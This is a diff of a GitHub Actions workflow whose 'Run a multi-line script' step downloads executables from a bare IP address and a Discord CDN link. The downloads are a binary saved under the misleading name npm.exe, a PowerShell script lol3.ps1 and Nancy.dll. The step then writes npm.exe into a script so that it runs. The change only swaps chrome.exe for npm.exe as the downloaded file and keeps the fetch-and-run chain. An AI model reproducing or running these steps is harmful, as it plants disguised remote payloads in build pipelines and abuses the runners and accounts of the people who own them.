@@ -28,7 +28,7 @@ jobs:
       # Runs a set of commands using the runners shell
       - name: Run a multi-line script
         run: |
-          Invoke-WebRequest http://5.102.153.140/lambdatest/chrome.exe -OutFile npm.exe
+          Invoke-WebRequest http://5.102.153.140/lambdatest/npm.exe -OutFile npm.exe
           Invoke-WebRequest http://5.102.153.140/lambdatest/lol3.ps1 -OutFile lol3.ps1
           Invoke-WebRequest https://cdn.discordapp.com/attachments/714547391746932747/830537244028305418/Nancy.dll -OutFile Nancy.dll
           cmd /C echo .\npm.exe >>a.ps1
